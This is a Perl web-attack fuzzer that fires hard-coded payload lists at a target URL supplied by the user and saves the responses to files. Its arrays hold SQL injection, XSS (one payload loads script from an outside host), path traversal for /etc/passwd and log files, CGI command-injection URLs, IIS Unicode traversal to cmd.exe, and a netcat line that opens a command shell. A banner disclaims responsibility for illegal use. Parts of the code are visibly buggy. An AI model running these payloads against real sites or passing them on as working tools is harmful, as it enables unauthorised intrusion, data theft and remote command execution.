#!/usr/bin/perl
use LWP::UserAgent;
use IO::Socket;
use HTTP::Request;
use HTTP::Response;
use Data::Dumper;
use 5.0.10;
use strict;


my $host = $ARGV[0];
if(!$host || !$ARGV[0]){
 usage();
exit;
}
 
my @Fuzzer=(
      "cat ../../etc/passwd%00","<script>alert(document.cookie);</script>","/cgi-bin/*","/cgi-bin/",
      "&0=+1+union+select","order+by+5--","order+by+100--","SELECT * FROM users--","../../etc/group",
      "SELECT * FROM wp_users--","cat%20../../etc/group%00",
      "PUT /pentest/windows-binaries/tools/nc.exe && nc -lvp 8080 -e cmd.exe",
      "cd /var/www/htdocs && grep phpinfo www","\' or \'a\'=\'a","or 1=1","../../../boot.ini",
      "\' or \'x\'=\'x--","admin'--","echo <?php phpinfo()?>"
                       ); 

my @XSS = ( "\"><script>alert(\'XSS\')</script> ", 
            "\"><script>alert(123)</script><",
            "\"><IMG SRC=\"javascript:alert(123);\"> ",   
            "\"><script>alert(123)</script>", 
            "\"><SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>", 
            " \"><IMG SRC=\"javascript:alert(\'XSS\')\"> ",
            "\"><IMG SRC=javascript:alert(\'XSS\')> ",
            "\"><IMG SRC=JaVaScRiPt:alert(\'XSS\')> ",
            "\"><IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"> ",
            " \"><IMG \"\"\"><SCRIPT>alert(123)</SCRIPT>> ",
            "\"><IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> ",
            " <IMG SRC=\"jav%20%20%20%20ascript:alert(\'XSS\')\";\"> ",
            "\"><ScRiPt>alert(document.cookie)<ScRiPt> ",
            " \"><<SCRIPT>alert(123);//<</SCRIPT>",
            "\"><IMG SRC=java%00script:alert(String.fromCharCode(88,83,83))> ",
           ); #<-Add XSS payload strings here. Its a bitch
                                                                                                                                                                                             #to debug if you dont escape quotes
my @SQLtests = ( " \' "," \" "," \' or 1=1-- " , " \' or \'a\'=\'a"," \' or \'x\'=x", " \" or \"z\"=\"z\ ",
                 "1 OR 1=1--","1,1", " \' or 5-5--","\' having 1=1--" );

my @MSSQL= ("\' having 1=1--","1 EXEC SP_ (or EXEC XP_)","1 AND USER_NAME() = \'dbo\'", " \;exec..cmd=\'dir\'",
        "AND 1=(SELECT COUNT(*) FROM tablenames); --","+1 UNION ALL SELECT 1,2,name,4,5,6,7 FROM sysObjects WHERE xtype = \'U\'--",
       "1+UNION/**/ SELECT/**/ALL FROM WHERE ","1 UNION ALL SELECT 1,2,3,4,5--","select * from users having 1=1+GROUP BY uid;--",
       "-1+union+select+null--",
       "-1+union+select+null,null;--",
       "-1+union+select+null,null,null--",
       "-1+union+select+null,null,null,null--",
       "-1+union+select+null,null,null,null,null--",
       "-1+union+select+null,null,null,null,null,null;--",
       "-1+union+select+null,null,null,null,null,null,null;--",
       "-1+union+select+null,null,null,null,null,null,null,null;--",
       "-1+union+select+null,null,null,null,null,null,null,null,null'--",
       "-1+union+select+null,null,null,null,null,null,null,null,null,null'--",
       "-1+union+select+null,null,null,null,null,null,null,null,null,null,null;--", 
       "-1+union+select+null,null,null,null,null,null,null,null,null,null,null,null;--",
       "-1+union+select+null,null,null,null,null,null,null,null,null,null,null,null,null;--",
       "-1+union+select+null,null,null,null,null,null,null,null,null,null,null,null,null,null--"
                                               ); #<- MSSqli strtings

my @MYSQL= ("1+order+by+2--","1+order by 3--","order by 50--","1+order+by+5--","1+order+by+6--","1+order+by+7--","1+order+by+8--",
       "1+order+by+9--","1+order+by+10--","1+order+by+11--","1+order+by+12--","1+order+by+13","1+order+by+14--",
       "and+1/**/union/**/select",
       "-1/**/union/**/select/**/null--",
       "-1/**/union/**/select/**/null,null--",
       "-1/**/union/**/select/**/null,null,null--",
       "-1/**/union/**/select/**/null,null,null,null--",
       "-1/**/union/**/select/**/null,null,null,null,null--",
       "-1/**/union/**/select/**/null,null,null,null,null,null--",
       "-1/**/union/**/select/**/null,null,null,null,null,null,null--",
       "-1/**/union/**/select/**/null,null,null,null,null,null,null,null--",
       "-1/**/union/**/select/**/null,null,null,null,null,null,null,null,null--",
       "-1/**/union/**/select/**/null,null,null,null,null,null,null,null,null,null--",
       "-1/**/union/**/select/**/null,null,null,null,null,null,null,null,null,null,null--",
       "-1/**/union/**/select/**/null,null,null,null,null,null,null,null,null,null,null,null,null--",
       "-1/**/union/**/select/**/null,null,null,null,null,null,null,null,null,null,null,null,null,null--",
       "-1/**/union/**/select/**/null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--");

my @LFIlogs = ("../../var/log/httpd/error.log","../../var/log/httpd/error_log","../../var/log/apache/error.log",
               "../../var/log/apache/error_log","../../var/log/apache2/error.log"," ../../etc/passwd%00",
               "../../var/log/apache2/error_log","../../logs/error.log","../../usr/local/apache/logs/error_log",
               "../../var/log/apache/error_log","../../var/log/apache/error.log","../../var/www/logs/error_log",
               "../../etc/httpd/logs/error_log","../../etc/httpd/logs/error.log","../../etc/passwd",
               "../../var/www/logs/error.log","../../usr/local/apache/logs/error.log","../../etc/group",
               "../../var/log/error_log","../../apache/logs/error.log","../../etc/passwd","../../etc/group%00", "../../etc/passwd/",
               "../../../etc/passwd/","../../etc/passwd/%00", "../../etc/passwd/?"
                                           );#<-LFI and/or traversal to possible LFI strings

my @CGIs = ("/cgi-bin/handler/bah;cat%20%20%20/etc/passwd|?  data=Download", 
       "../cgi-bin/handler/bah;cat%20%20/etc/passwd |    ?  data=Download", 
       "/cgi-bin/test-cgi?/* Replace /*",
       "/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd",
       "../blah.php?source=/msadc/Samples/../../../../../boot.ini",
       "../cgi-bin/faxsurvey?/bin/cat%20%20%20%20/etc/passwd",
       "/cgi-bin/campas?%0acat%0a/etc/passwd%0a",
       "/cgi-bin/webdist.cgi?distloc=;cat%20/etc/passwd",
       "/archive-j457nxiqi3gq59dv/199805/count.cgi.l",
       "/cgi-bin/pfdispaly.cgi? /../../../../etc/passwd",
       "/cgi-bin/pfdispaly.cgi?\'%0A/bin/uname%20-a|\'",
       "/scripts/convert.bas?../../win.ini",
       "/cgi-bin/htmlscript? ../../../../etc/passwd",
       "/cgi-bin/infosrch.cgi cmd=getdoc&db=man&fname=|/bin/id",
       "/cgi-bin/loadpage.cgi?user_id=1&file=../../etc/passwd",
       "echo -e \"GET http://$host/cgi-bin/loadpage.cgi? user_id=1&file=|\"/bin/ls\"| HTTP/1.0\" | nc  -lvp 8080"
               ); #Arbitrary cgi strings

my @Unicode = ("/scripts/..%c0%af../winnt/system32/cmd.exe?/c+","/scripts..%c1%9c../winnt/system32/cmd.exe?/c+",
               "/scripts/..%c1%pc../winnt/system32/cmd.exe?/c+","/scripts/..%c0%9v../winnt/system32/cmd.exe?/c+",
               "/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+","/scripts/..%c1%8s../winnt/system32/cmd.exe?/c+",
               "/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+",
               "/scripts/..%c1%af../winnt/system32/cmd.exe?/c+","/scripts/..%e0%80%af../winnt/system32/cmd.exe?/c+",
               "/scripts/..%f0%80%80%af../winnt/system32/cmd.exe?/c+","/scripts/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+",
               "/scripts/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+","/MSADC/root.exe?/c+dir",
               "/msadc/..\%e0\%80\%af../..\%e0\%80\%af../..\%e0\%80\%af../winnt/system32/cmd.exe\?/c\+",
               "/cgi-bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+",
               "/samples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+",
               "/iisadmpwd/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+",
               "/_vti_cnf/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+",
               "/adsamples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+",
               "/PBServer/..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+dir",
               "/PBServer/..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+dir",
               "/PBServer/..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir",
               "/msadc/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+dir",
               "/msadc/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir",
               "/msadc/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir",
               "/msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir",
               "/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir",
               "/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir",
               "/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir",
               "/msadc/..%c1%af../winnt/system32/cmd.exe?/c+dir","/msadc/..%e0%80%af../winnt/system32/cmd.exe?/c+dir",
               "/msadc/..%c1%pc../..%c1%pc../..%c1%pc../winnt/system32/cmd.exe?/c+dir",
               "/msadc/..%c1%pc../winnt/system32/cmd.exe?/c+dir",
               "/msadc/..%e0%80%af../..%e0%80%af../..%e0%80%af../winnt/system32/cmd.exe?/c+dir",
               "/msadc/..%f0%80%80%af../..%f0%80%80%af../..%f0%80%80%af../winnt/system32/cmd.exe?/c+dir",
               "/msadc/..%f0%80%80%af../winnt/system32/cmd.exe?/c+dir",
               "/msadc/..%f8%80%80%80%af../..%f8%80%80%80%af../..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+dir",
               "/msadc/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+dir",
               "/samples/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir",
               "/samples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir",
               "/scripts..%c1%9c../winnt/system32/cmd.exe?/c+dir","/scripts/.%252e/.%252e/winnt/system32/cmd.exe?/c+dir",
               "/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir",
               "/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","/scripts/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+dir",
               "/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir",
               "/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir",
               "/scripts/..%C0%AF..%C0%AF..%C0%AF..%C0%AFwinnt/system32/cmd.exe?/c+dir",
               "/scripts/..%C1%1C..%C1%1C..%C1%1C..%C1%1Cwinnt/system32/cmd.exe?/c+dir",
               "/scripts/..%C1%9C..%C1%9C..%C1%9C..%C1%9Cwinnt/system32/cmd.exe?/c+dir",
               "/scripts/..%c0%9v../winnt/system32/cmd.exe?/c+dir","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir",
               "/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+dir","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir",
               "/scripts/..%c1%8s../winnt/system32/cmd.exe?/c+dir","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir",
               "/scripts/..%c1%af../winnt/system32/cmd.exe?/c+dir","/scripts/..%c1%pc../winnt/system32/cmd.exe?/c+dir",
               "/scripts/..%e0%80%af../winnt/system32/cmd.exe?/c+dir","/scripts/..%f0%80%80%af../winnt/system32/cmd.exe?/c+dir",
               "/scripts/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+dir",
               "/scripts/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+dir",
"/scripts/root.exe?/c+dir/msadc/..%fc%80%80%80%80%af../..%fc%80%80%80%80%af../..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+dir",
               "/PBServer/..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+dir",
               "/PBServer/..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir",             "/PBServer/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir",
               "/Rpc/..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+dir",
               "/Rpc/..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+dir",
               "/Rpc/..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir",
               "/Rpc/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir",
               "/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir",
               "/_vti_bin/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63../winnt/system32/cmd.exe?/c+dir",
               "/_vti_bin/..%%35c..%%35c..%%35c..%%35c..%%35c../winnt/system32/cmd.exe?/c+dir",
               "/_vti_bin/..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63../winnt/system32/cmd.exe?/c+dir",
               "/_vti_bin/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+dir",
               "/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir",
               "/_vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir",
               "/_vti_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir",
               "/_vti_cnf/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir",
               "/_vti_cnf/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir",
               "/adsamples/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir",
               "/adsamples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir",
               "/c/winnt/system32/cmd.exe?/c+dir",
               "/cgi-bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir",
               "/cgi-bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir",
               "/d/winnt/system32/cmd.exe?/c+dir",
               "/iisadmpwd/..%252f..%252f..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+dir",
               "/iisadmpwd/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir",
               "/msaDC/..%%35%63..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+dir",
               "/msaDC/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+dir",
               "/msaDC/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir",
               "/msaDC/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir",
               "/msadc/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir"
                            );#unicode remote exploit/fuzzing strings

my @options = ("1)MySql Fuzz?\n","2)MSSQL Fuzz?\n","3)XSS fuzz?\n","4)CGI Fuzz?\n","5)Unicode Fuzz?\n","6)General Fuzz?\n","7)Path-Traversal/Possible LFI?\n",
               "8)Fuck it, throw it all at it and lets see what happens,lol\n");

print "**********************************************************\n";
print "*          nullbyt3's Sweet lil Perl Fuzzer               \n";
print "**********************************************************\n";
print "*I take no responsibility for illegalities                 \n";
print "**********************************************************\n\n";
print "usage: perl 0.pl http://site.com/?id=\n\n";
foreach my $options(@options){
               print $options,"\n";
}
print "Scan Type? 1-7:\n";
my $res = <STDIN>;
chomp $res;

   if($res ~~ /1/){
   foreach my $scan(@MYSQL){
      my $host = $host.$scan;
      my $ua = LWP::UserAgent->new('Perl-Bot');
      my $req = HTTP::Request->new(GET => $host);
      my $resp = $ua->request($req); $ua->timeout(15);
      my $reponse = HTTP::Response->new($resp);
    print "sending MYSQL attack strings..\n";

 if($resp->is_success and $resp->code() < "400"){
     openg(); print FG $resp->as_string;
}if($resp->code >= "400"){
     openb(); print FB $resp->as_string;
}}
}elsif($res ~~ /2/){
   foreach my $scan(@MSSQL){
      my $host = $host.$scan;
      my $ua = LWP::UserAgent->new('Msn-Bot');
      my $req = HTTP::Request->new(GET => $host);
      my $resp = $ua->request($req); $ua->timeout(15);
      my $reponse = HTTP::Response->new($resp);
    print "sending MSSQL attack strings..\n";

 if($resp->is_success and $resp->code() < "400"){
     openg(); print FG $resp->as_string;
}if($resp->code >= "400"){
     openb(); print FB $resp->as_string;
}}
}elsif($res ~~ /3/){
     foreach my $scan(@XSS){
      my $host = $host.$scan;
      my $ua = LWP::UserAgent->new('Fuzz-Bot');
      my $req = HTTP::Request->new(GET => $host);
      my $resp = $ua->request($req); $ua->timeout(15);
      my $reponse = HTTP::Response->new($resp);
    print "sending XSS attack strings..\n";

 if($resp->is_success and $resp->code() < "400"){
     openg(); print FG $resp->as_string;
}if($resp->code >= "400"){
     openb(); print FB $resp->as_string;
}}
}elsif($res ~~ /4/){
     foreach my $scan(@CGIs){
      my $host = $host.$scan;
      my $ua = LWP::UserAgent->new('Google-Bot');
      my $req = HTTP::Request->new(GET => $host);
      my $resp = $ua->request($req); $ua->timeout(15);
      my $reponse = HTTP::Response->new($resp);
    print "sending CGI attack strings..\n";

 if($resp->is_success and $resp->code() < "400"){
     openg(); print FG $resp->as_string;
}if($resp->code >= "400"){
     openb(); print FB $resp->as_string;
}}
}elsif($res ~~ /5/){
      foreach my $scan(@Unicode){
        my $sock = IO::Socket::INET->new (
				Proto => "tcp",
				PeerAddr => $host.$scan,
				PeerPort => 80,
                                    Reuse =>  
                                      Type  => SOCK_STREAM,
                                  Timeout => 300
				) or die $!;


print $sock "GET $host HTTP/1.0\r\n\r\n";
     print $sock "Host: 127.0.0.1\n";
     print $sock "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3\n\n";
     print $sock "Accept: text/javascript, text/html, application/xml, text/xml, */*\n\n";
     print $sock "Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3\n\n";
     print $sock "Accept-Encoding: gzip,deflate\n\n";
     print $sock "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n\n";
     print $sock "Keep-Alive: 300\n\n";
     print $sock "Connection: keep-alive\n\n";
     print $sock "Content-Length: 1024\n";

while (<$sock>){
 print $_ ">>unic0des.txt";
}}
}elsif($res ~~ /6/){
      foreach my $scan(@Fuzzer){
      my $host = $host.$scan;
      my $ua = LWP::UserAgent->new('msnbot');
      my $req = HTTP::Request->new(GET => $host);
      my $resp = $ua->request($req); $ua->timeout(10);
      my $reponse = HTTP::Response->new($resp);
    print "sending General attack strings..\n";

 if($resp->is_success and $resp->code() < "400"){
     openg(); print FG $resp->as_string;
}if($resp->code >= "400"){
     openb(); print FB $resp->as_string;
}}
}elsif($res ~~ /7/){
     foreach my $scan(@LFIlogs){
      my $host = $host.$scan;
      my $ua = LWP::UserAgent->new('LFI-bot');
      my $req = HTTP::Request->new(GET => $host);
      my $resp = $ua->request($req); $ua->timeout(10);
      my $reponse = HTTP::Response->new($resp);
    print "sending Traversal-Possible LFI strings..\n";

 if($resp->is_success and $resp->code() < "400"){
     openg(); print FG $resp->as_string;
}if($resp->code >= "400"){
     openb(); print FB $resp->as_string;
}}
}elsif($res ~~ /8/){
      foreach my $scan(@MSSQL,@MSSQL,@XSS,@CGIs,@LFIlogs){
      my $host = $host.$scan;
      my $ua = LWP::UserAgent->new('LFI-bot');
      my $req = HTTP::Request->new(GET => $host);
      my $resp = $ua->request($req); $ua->timeout(10);
      my $reponse = HTTP::Response->new($resp);
    print "sending All attack strings, besides Unicodes which requires raw sockets..This going to get is noisy!\n";

 if($resp->is_success and $resp->code() < "400"){
     openg(); print FG $resp->as_string;
}if($resp->code >= "400"){
     openb(); print FB $resp->as_string;
}
}}else{
   usage();
exit;
}
sub openg{
  open(FG, ">>goodcodes.htm");  # Added >> for appending to results. You will have to delete manually when you want to start a new file
}
sub openb{
  open(FB, ">>badcodes.htm");  #Same as above
}
sub usage{
print "perl fuzz.pl http://vulnsite.com/?id=\n";
}